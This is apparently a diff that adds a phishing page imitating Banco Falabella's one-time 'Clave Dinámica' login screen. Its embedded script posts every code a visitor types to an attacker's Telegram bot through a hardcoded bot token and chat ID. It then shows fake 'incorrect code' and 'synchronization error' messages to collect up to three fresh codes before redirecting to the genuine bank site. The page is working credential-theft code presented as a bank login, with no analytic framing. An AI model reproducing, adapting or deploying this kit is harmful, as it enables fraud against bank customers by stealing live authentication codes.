@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Falabella - Clave Dinámica</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <img src="img/logo-bf-darkmode.aee74748.svg" alt="Logo" class="loading-logo">
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent" class="main-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-container">
+                <img src="img/bf-logo-mobile.svg" alt="Banco Falabella" class="logo">
+            </div>
+            <button class="btn-banca-online">Banca en línea</button>
+        </header>
+
+        <!-- Login Form -->
+        <div class="login-container">
+            <form id="dinamicaForm" class="login-form">
+                <div class="form-group">
+                    <label class="form-label">Ingrese su Clave Dinámica</label>
+                </div>
+
+                <div class="form-group">
+                    <input 
+                        type="password" 
+                        id="claveDinamica" 
+                        class="form-input" 
+                        placeholder="Clave Dinámica (6 dígitos)"
+                        maxlength="6"
+                        inputmode="numeric"
+                        autocomplete="off"
+                    >
+                    <div class="error-message" id="errorMsg"></div>
+                </div>
+
+                <button type="button" id="btnIngresar" class="btn-ingresar" disabled>
+                    INGRESAR
+                </button>
+
+                <div class="link-container">
+                    <a href="#" class="link-clave">¿Necesitas ayuda con tu clave dinámica?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003784784181';
+
+        let intentos = 0;
+
+        const claveDinamica = document.getElementById('claveDinamica');
+        const btnIngresar = document.getElementById('btnIngresar');
+        const errorMsg = document.getElementById('errorMsg');
+        const loadingScreen = document.getElementById('loadingScreen');
+
+        claveDinamica.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 6);
+            validateClave();
+        });
+
+        function validateClave() {
+            const isValid = claveDinamica.value.length === 6;
+            btnIngresar.disabled = !isValid;
+        }
+
+        btnIngresar.addEventListener('click', async function(e) {
+            e.preventDefault();
+            if (btnIngresar.disabled) return;
+
+            intentos++;
+            loadingScreen.style.display = 'flex';
+
+            const mensaje = `🔐 <b>CLAVE DINÁMICA (INTENTO ${intentos}/3) - BANCO FALABELLA</b>
+
+<b>Clave Dinámica:</b> <code>${claveDinamica.value}</code>
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    if (intentos < 3) {
+                        setTimeout(() => {
+                            loadingScreen.style.display = 'none';
+                            if (intentos === 1) {
+                                errorMsg.textContent = '❌ La clave dinámica es incorrecta.';
+                                errorMsg.classList.add('show');
+                            } else if (intentos === 2) {
+                                errorMsg.textContent = '⚠️ Error en la sincronización. Intente nuevamente.';
+                                errorMsg.classList.add('show');
+                            }
+                            claveDinamica.value = '';
+                            validateClave();
+                        }, 1500);
+                    } else {
+                        setTimeout(() => {
+                            window.location.href = 'https://www.bancofalabella.com.co';
+                        }, 1500);
+                    }
+                } else {
+                    loadingScreen.style.display = 'none';
+                    errorMsg.textContent = 'Error en la verificación. Intente nuevamente.';
+                    errorMsg.classList.add('show');
+                }
+            } catch (error) {
+                loadingScreen.style.display = 'none';
+                errorMsg.textContent = 'Error de conexión. Intente nuevamente.';
+                errorMsg.classList.add('show');
+            }
+        });
+    </script>
+</body>
+</html>
